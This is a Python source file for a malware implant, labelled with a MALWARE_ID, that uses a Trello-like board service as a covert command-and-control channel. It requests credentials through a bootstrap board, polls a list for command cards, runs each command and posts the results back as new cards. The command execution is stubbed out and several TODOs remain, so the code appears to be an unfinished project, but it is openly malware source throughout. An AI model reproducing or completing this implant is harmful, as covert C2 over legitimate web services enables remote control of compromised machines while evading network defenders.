import api_utils as utils
import time
import json
MALWARE_ID = '636a26'

def bootstrap():
    # TODO: exchange keys to encrypt the account credentials
    
    
    # TODO: post request on bootstrap for new accoun
    list_name = 'new_creds_'+MALWARE_ID
    # opens new list
    utils.create_list(list_name, utils.BOOTSTRAP_BOARD_ID)
    # gets the id of the created list
    new_list_id = utils.get_list_id(list_name, utils.BOOTSTRAP_BOARD_ID)
    # open card with request on the new list
    utils.create_card(new_list_id, utils.CRED_REQ_CARD_NAME)

    # TODO: receive new account from the bootstrap board
    # waits until new card appears on new list containing the cred.
    # TODO: check error codes, description is as expected5
    cred_card_id = None
    while not cred_card_id:
        cards = utils.get_cards_in_list(new_list_id)
        for card in cards:
            if card['name'] == utils.CRED_ANS_CARD_NAME:
                cred_card_id = card['id']
        time.sleep(10)
    utils.ACCOUNT_KEY, utils.ACCOUNT_TOKEN = utils.get_creds_from_card(cred_card_id)
    utils.IS_BOOTSTRAP = False

    # TODO: delete the bootstrap request list 
    utils.archive_list(new_list_id)


def exec_command(command):
    return "success"


def main():
    # get the token and key from the bootstrap
    print("----------------bootstrapping-------------------")
    bootstrap()
    print("------------------got creds---------------------")
    print("------------------moving to new account------------------")
    boards = utils.get_boards()
    # for now, asssume we only have one board and it contains one list for communication
    board_id = boards[0]['id']
    # TODO: check if the board is the right one and is not empty
    lists = utils.get_lists_in_board(board_id)
    # TODO: check if the list is the right one
    list_id = lists[0]['id']
    finished_command_ids = []
    while True:
        cards = utils.get_cards_in_list(list_id)
        for card in cards:
            command_id = card['name'].split(':')[0]
            if command_id not in finished_command_ids:
                finished_command_ids.append(command_id)
                command_card_id = card['id']
                command = utils.get_command_from_card(command_card_id)
                print("executing command: " + command)
                result = exec_command(command)
                utils.create_card(list_id, command_id + ": resp", desc=result)
        time.sleep(10)


if __name__ == '__main__':
    main()
